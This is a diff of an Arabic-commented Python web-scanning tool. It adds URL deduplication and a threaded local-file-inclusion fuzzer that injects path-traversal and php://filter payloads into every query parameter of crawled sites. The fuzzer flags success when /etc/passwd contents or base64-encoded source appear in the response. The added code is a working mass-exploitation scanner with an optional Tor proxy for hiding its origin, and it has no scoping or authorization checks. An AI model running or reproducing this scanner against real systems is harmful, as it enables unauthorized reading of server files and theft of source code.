@@ -1,5 +1,7 @@
 from datetime import datetime
 import subprocess
+from urllib.parse import urlparse, parse_qs, urlunparse, urlencode
+
 import argments
 import re
 import os
@@ -142,23 +144,64 @@ def deepCrawl(website, place):
 ########################################
 #########     EXTRACT AND DOWNLOAD  #########
 def extract_parameter_urls(place):
-    input_file=place+"/finalRawlers.txt"
-    output_file=place+"/Parameters.txt"
-    print(f"[+] Filtering URLs with parameters from {input_file}...")
-    ignored_extensions = (".jpg", ".jpeg", ".png", ".gif", ".css", ".js", ".svg")
+    input_file = os.path.join(place, "finalRawlers.txt")
+    output_file = os.path.join(place, "Parameters.txt")
+
+    print(colored(f"[+] Filtering & Deduplicating URLs with parameters from {input_file}...", "blue"))
+
+    ignored_extensions = (".jpg", ".jpeg", ".png", ".gif", ".css", ".js", ".svg", ".woff", ".ico")
+
+    unique_urls = []  # لتخزين الروابط النهائية
+    seen_signatures = set()  # لتخزين "بصمة" الرابط لمنع التكرار
+
     count = 0
     try:
-        with open(input_file, 'r') as f_in, open(output_file, 'a') as f_out:
-            for line in f_in:
-                url = line.strip()
-                if "?" in url and "=" in url:
-                    if not url.lower().endswith(ignored_extensions):
-                        f_out.write(url + "\n")
-                        count += 1
-        print(colored(f"[+] Done! Found {count} parameter URLs. Saved to {output_file}","cyan") )
-        subprocess.run(f"chmod -R 777 {output_file}", shell=True)
-    except FileNotFoundError:
-        print(colored(f"[-] Error: File {input_file} not found!","red") )
+        # 1. القراءة والفلترة في الذاكرة
+        if os.path.exists(input_file):
+            with open(input_file, 'r', encoding='utf-8', errors='ignore') as f_in:
+                for line in f_in:
+                    url = line.strip()
+
+                    # الشرط الأول: وجود باراميترات
+                    if "?" in url and "=" in url:
+                        # الشرط الثاني: الامتدادات
+                        if not url.lower().endswith(ignored_extensions):
+
+                            # === اللوجيك الذكي (Smart Deduplication) ===
+                            try:
+                                parsed = urlparse(url)
+                                # بنجيب أسماء الباراميترات (keys) فقط من غير القيم
+                                query_params = parse_qs(parsed.query)
+                                param_keys = tuple(sorted(query_params.keys()))
+
+                                # البصمة = الدومين + المسار + أسماء الباراميترات
+                                # أي رابط ليه نفس البصمة دي هيعتبر تكرار ومش هيتحفظ
+                                signature = (parsed.netloc, parsed.path, param_keys)
+
+                                if signature not in seen_signatures:
+                                    seen_signatures.add(signature)
+                                    unique_urls.append(url)
+                                    count += 1
+                            except Exception:
+                                # لو حصل ايرور في تحليل رابط معين، عده ومتقفش
+                                pass
+
+            # 2. حفظ النتائج النظيفة في الملف
+            # استخدمنا 'w' عشان يكتب النتائج الجديدة، لو عاوز 'a' غيرها
+            with open(output_file, 'w', encoding='utf-8') as f_out:
+                for unique_url in unique_urls:
+                    f_out.write(unique_url + "\n")
+
+            print(colored(f"[+] Done! Found {count} UNIQUE parameter URLs. Saved to {output_file}", "cyan"))
+
+            # تعديل الصلاحيات
+            subprocess.run(f"chmod -R 777 {output_file}", shell=True)
+
+        else:
+            print(colored(f"[-] Error: File {input_file} not found!", "red"))
+
+    except Exception as e:
+        print(colored(f"[-] Critical Error in filtering: {e}", "red"))
 def extract_files_urls(place,type):
     input_file=place+f"/finalRawlers.txt"
     output_file=place+f"/{type}.txt"
@@ -419,7 +462,7 @@ def count_vulnerabilities(filename):
         with open(filename, 'r') as f:
             for line in f:
                 # بنعد المرات اللي كلمة Target ظهرت فيها في بداية السطر
-                if line.strip().startswith("Target:") or line.strip().startswith("[VULN CHECK]"):
+                if line.strip().startswith("Target:") or line.strip().startswith("[VULN CHECK]") or line.strip().startswith("[System File Access"):
                     count += 1
         return count
     except FileNotFoundError:
@@ -729,174 +772,8 @@ def scan_ssrf_mass(place, use_tor=False):
         print(colored(f"   [-] Error: {e}", "red"))
 #######################################
 ############    LFI      ##############
-def scan_lfi_nuclei(place, use_tor=False):
-    targets_file = f"{place}/Parameters.txt"
-    output_file = f"{place}/lfi.txt"
-
-    print(colored(f"\n[+] Starting LFI Scan...", "yellow", attrs=['bold']))
-
-    if not os.path.exists(targets_file):
-        print(colored("[-] No targets found (Parameters.txt is missing).", "red"))
-        return
-
-    proxy_flag = ""
-    if use_tor:
-        proxy_flag = " -proxy socks5://127.0.0.1:9050"
 
 
-    command = f"nuclei -l {targets_file} -tags lfi {proxy_flag} -o {output_file} -silent"
-
-    try:
-        subprocess.run(command, shell=True, timeout=300)
-
-        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
-            print(colored(f"   [!!!] LFI VULNERABILITIES FOUND (Nuclei)!", "red", attrs=['bold']))
-
-            with open(output_file, 'r') as f:
-                for line in f:
-                    print(colored(f"   └── {line.strip()}", "yellow"))
-        else:
-            print(colored("   [-] No LFI found by Nuclei.", "white"))
-
-    except subprocess.TimeoutExpired:
-        print(colored("   [-] LFI Scan Timed out.", "white"))
-    except Exception as e:
-        print(colored(f"   [-] Error: {e}", "red"))
-
-def check_single_payload(target_url, payload, success_indicators):
-    full_url = f"{target_url}{payload}"
-    try:
-        # Timeout سريع جداً (ثانيتين)
-        response = requests.get(full_url, timeout=2)
-
-        for indicator in success_indicators:
-            if indicator in response.text:
-                return (full_url, payload, indicator)  # رجع النتيجة لو لقيت ثغرة
-    except:
-        return None
-    return None
-# الدالة الرئيسية
-def scan_lfi_bulk_fast(place):
-    targets_file = f"{place}/Parameters.txt"
-    current_dir = os.path.dirname(os.path.abspath(__file__))
-    payloads_file = os.path.join(current_dir, 'WordLists', 'LFI.txt')
-    current_tool_dir = os.path.dirname(os.path.abspath(__file__))
-    if payloads_file is None:
-        payloads_file = os.path.join(current_tool_dir, "WordLists", "LFI.txt")
-
-    # قراءة الملفات
-    if not os.path.exists(payloads_file): return []
-    with open(payloads_file, "r") as f:
-        payloads = [l.strip() for l in f.readlines() if l.strip()]
-
-    if not os.path.exists(targets_file): return []
-    with open(targets_file, "r") as f:
-        targets = [l.strip() for l in f.readlines() if l.strip()]
-
-    success_indicators = ["root:x:0:0", "daemon:x", "[boot loader]", "win.ini"]
-    vulnerable_findings = []
-
-    print(colored(f"[*] Turbo Mode ON 🚀 - Scanning {len(targets)} targets with {len(payloads)} payloads...", "cyan"))
-
-    # هنا السحر: بنشغل 10 عمال (Threads) يشتغلوا مع بعض
-    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-        for url in targets:
-            print(colored(f"[*] Scanning Target: {url}", "white"))
-
-            # تجهيز المهام
-            future_to_payload = {executor.submit(check_single_payload, url, p, success_indicators): p for p in payloads}
-
-            for future in concurrent.futures.as_completed(future_to_payload):
-                result = future.result()
-                if result:
-                    full_url, payload, indicator = result
-                    print(colored(f"    [+] VULN FOUND! 🚨 {payload}", "green", attrs=['bold']))
-                    vulnerable_findings.append({"target": url, "payload": payload, "evidence": indicator})
-
-                    # (اختياري) لو عايز توقف باقي البايلودز لنفس اللينك عشان تنجز
-                    # هنا الموضوع صعب شوية في الثريدنج، بس كمل عادي السرعة هتعوضك
-
-    return vulnerable_findings
-def scan_lfi_bulk( place):
-    print(colored(f"\n[*] Starting Bulk LFI Scan...", "blue", attrs=['bold']))
-    targets_file = f"{place}/Parameters.txt"
-    current_dir=os.path.dirname(os.path.abspath(__file__))
-    payloads_file=os.path.join(current_dir, 'WordLists','LFI.txt')
-    print(payloads_file)
-    # 1. قراءة التارجتس (اللينكات) من الفايل
-    try:
-        with open(targets_file, "r") as f:
-            # بنشيل المسافات والسطر الجديد ونتأكد إن السطر مش فاضي
-            targets = [line.strip() for line in f.readlines() if line.strip()]
-    except FileNotFoundError:
-        print(colored(f"[!] Error: Targets file '{targets_file}' not found!", "red"))
-        return []
-
-    # 2. قراءة البايلودز
-    try:
-        with open(payloads_file, "r") as f:
-            payloads = [line.strip() for line in f.readlines() if line.strip()]
-    except FileNotFoundError:
-        print(colored(f"[!] Error: Payloads file '{payloads_file}' not found!", "red"))
-        return []
-
-    # علامات نجاح الثغرة
-    success_indicators = ["root:x:0:0", "daemon:x", "[boot loader]", "win.ini"]
-
-    # قائمة لتخزين النتايج الإيجابية فقط
-    vulnerable_findings = []
-
-    print(colored(f"[*] Loaded {len(targets)} targets and {len(payloads)} payloads.\n", "cyan"))
-
-    # --- بداية الـ Fuzzing ---
-
-    # اللوب الأولى: تمسك لينك لينك
-    for url in targets:
-        print(colored(f"[*] Scanning: {url}", "white"))
-
-        is_vuln_found = False  # علم عشان نعرف لو لقينا حاجة في اللينك ده
-
-        # اللوب الثانية: تجرب البايلودز على اللينك ده
-        for payload in payloads:
-
-            # تجهيز الرابط (تأكد إن اللينك في الفايل آخره علامة =)
-            # لو اللينك مش آخره = ممكن تزودها هنا بالكود لو حابب
-            target_url = f"{url}{payload}"
-
-            try:
-                response = requests.get(target_url, timeout=0.5)  # Timeout سريع عشان ننجز
-
-                # فحص الرد
-                for indicator in success_indicators:
-                    if indicator in response.text:
-                        # !!! ثغرة لقيتها !!!
-                        print(colored(f"    [+] VULN FOUND! Payload: {payload}", "green", attrs=['bold']))
-
-                        # سجل النتيجة
-                        finding = {
-                            "target": url,
-                            "payload": payload,
-                            "full_url": target_url,
-                            "evidence": indicator
-                        }
-                        vulnerable_findings.append(finding)
-
-                        is_vuln_found = True
-                        break  # اخرج من لوب الـ indicators
-
-                if is_vuln_found:
-                    break  # اخرج من لوب الـ payloads (عشان اللينك ده خلاص اتعرف إنه مصاب)
-
-            except requests.exceptions.RequestException:
-                # لو اللينك ميت أو السيرفر عمل بلوك، فوت وجرب اللي بعده
-                continue
-
-        # لو خلصنا كل البايلودز ومفيش حاجة ظهرت للينك ده
-        if not is_vuln_found:
-            pass  # كمل على اللينك اللي بعده في صمت (أو اطبع إنه سليم لو حابب)
-
-    print(colored(f"\n[+] Scan Finished. Found {len(vulnerable_findings)} vulnerabilities.", "yellow", attrs=['bold']))
-    return vulnerable_findings
 #######################################
 ############ Report Generator #########
 def generate_json_report(domain, place):
@@ -1161,3 +1038,183 @@ def generate_ai_report(apikey,json_data,place):
 
     except Exception as e:
         print(f"[!] AI Error: {e}")
+
+###############################################
+##############      LFI     ###################
+def scan_lfi_nuclei(place, use_tor=False):
+    targets_file = f"{place}/Parameters.txt"
+    output_file = f"{place}/lfi.txt"
+
+    print(colored(f"\n[+] Starting LFI Scan...", "yellow", attrs=['bold']))
+
+    if not os.path.exists(targets_file):
+        print(colored("[-] No targets found (Parameters.txt is missing).", "red"))
+        return
+
+    proxy_flag = ""
+    if use_tor:
+        proxy_flag = " -proxy socks5://127.0.0.1:9050"
+
+
+    command = f"nuclei -l {targets_file} -tags lfi {proxy_flag} -o {output_file} -silent"
+
+    try:
+        subprocess.run(command, shell=True, timeout=300)
+
+        if os.path.exists(output_file) and os.path.getsize(output_file) > 0:
+            print(colored(f"   [!!!] LFI VULNERABILITIES FOUND (Nuclei)!", "red", attrs=['bold']))
+
+            with open(output_file, 'r') as f:
+                for line in f:
+                    print(colored(f"   └── {line.strip()}", "yellow"))
+        else:
+            print(colored("   [-] No LFI found by Nuclei.", "white"))
+
+    except subprocess.TimeoutExpired:
+        print(colored("   [-] LFI Scan Timed out.", "white"))
+    except Exception as e:
+        print(colored(f"   [-] Error: {e}", "red"))
+
+SIG_LINUX = "root:x:0:0"
+TIMEOUT = 5
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Firefox/102.0"
+}
+
+# بايلودز احتياطية لو الملف الخارجي مش موجود
+DEFAULT_PAYLOADS = [
+    "../../../../etc/passwd",
+    "../../../../../etc/passwd",
+    "/etc/passwd",
+    "php://filter/convert.base64-encode/resource=index.php"
+]
+
+
+def load_payloads_from_file(file_path):
+    """
+    بتقرأ البايلودز من ملف خارجي
+    """
+    if not file_path or not os.path.exists(file_path):
+        print(colored(f"[!] Payload file '{file_path}' not found. Using default list.", "yellow"))
+        return DEFAULT_PAYLOADS
+
+    try:
+        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
+            # strip() عشان يشيل المسافات والأسطر الزيادة
+            payloads = [line.strip() for line in f if line.strip()]
+
+        print(colored(f"[*] Loaded {len(payloads)} custom payloads from file.", "cyan"))
+        return payloads
+    except Exception as e:
+        print(colored(f"[!] Error reading payload file: {e}", "red"))
+        return DEFAULT_PAYLOADS
+
+
+def generate_malicious_urls(url, payloads_list):
+    """
+    بتاخد اللينك وقائمة البايلودز وتعمل Fuzzing
+    """
+    parsed = urlparse(url)
+    query_params = parse_qs(parsed.query)
+
+    if not query_params:
+        return []
+
+    malicious_links = []
+
+    for param_name in query_params:
+        for payload in payloads_list:
+            new_params = query_params.copy()
+
+            # [payload] لأن الـ urlencode بتحتاج القيمة تكون List
+            new_params[param_name] = [payload]
+
+            new_query = urlencode(new_params, doseq=True)
+            new_parts = list(parsed)
+            new_parts[4] = new_query
+            full_malicious_url = urlunparse(new_parts)
+
+            malicious_links.append(full_malicious_url)
+
+    return malicious_links
+
+
+def scan_single_url(target_url):
+    """
+    الفانكشن اللي بتشتغل جوه الـ Thread
+    """
+    try:
+        req = requests.get(target_url, headers=HEADERS, timeout=TIMEOUT)
+
+        # 1. فحص ملف etc/passwd
+        if SIG_LINUX in req.text:
+            return (target_url, "System File Access (/etc/passwd)")
+
+        # 2. فحص Base64 (Source Code Disclosure)
+        if "php://filter" in target_url and len(req.text) > 100:
+            # نتأكد إنه مش مجرد Error Message
+            if "<?php" in req.text or (len(req.text) % 4 == 0 and "=" in req.text[-2:]):
+                return (target_url, "Potential Source Code Disclosure")
+
+    except:
+        pass
+
+    return None
+
+
+def run_lfi_scan(place, threads=20):
+    """
+    الفانكشن الرئيسية
+    """
+
+    output_file=f"{place}/lfi_results.txt"
+    urls_file_path=f"{place}/Parameters.txt"
+    current_dir = os.path.dirname(os.path.abspath(__file__))
+    payloads_file_path = os.path.join(current_dir, 'WordLists', 'LFI.txt')
+    print(colored(f"\n--- [ LFI Scanner Module ] ---", "yellow", attrs=['bold']))
+
+    # 1. تحميل البايلودز
+    # لو بعت None هيستخدم الافتراضي
+    current_payloads = load_payloads_from_file(payloads_file_path)
+
+    # 2. قراءة اللينكات
+    if not os.path.exists(urls_file_path):
+        print(colored(f"[!] URLs file not found: {urls_file_path}", "red"))
+        return
+
+    with open(urls_file_path, 'r') as f:
+        urls = [line.strip() for line in f if line.strip()]
+
+    # 3. تجهيز المهام
+    tasks = []
+    print(colored("[*] Generating attack vectors...", "blue"))
+
+    for url in urls:
+        # بنبعت قائمة البايلودز هنا
+        infected_links = generate_malicious_urls(url, current_payloads)
+        tasks.extend(infected_links)
+
+    if not tasks:
+        print(colored("[!] No parameters found to fuzz.", "yellow"))
+        return
+
+    print(colored(f"[*] Total Requests: {len(tasks)} | Threads: {threads}", "cyan"))
+
+    # 4. تشغيل الـ Threads
+    vulnerabilities = []
+    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+        results = executor.map(scan_single_url, tasks)
+
+        for res in results:
+            if res:
+                vuln_url, vuln_type = res
+                print(colored(f"\n[+] VULNERABILITY FOUND! ({vuln_type})", "red", attrs=['bold']))
+                print(colored(f"    URL: {vuln_url}", "white"))
+
+                vulnerabilities.append(f"[{vuln_type}] {vuln_url}")
+
+                with open(output_file, "a") as f:
+                    f.write(f"[{vuln_type}] {vuln_url}\n")
+
+    print(colored(f"\n[+] Scan Finished. Found {len(vulnerabilities)} vulnerabilities.", "green"))
+    return vulnerabilities
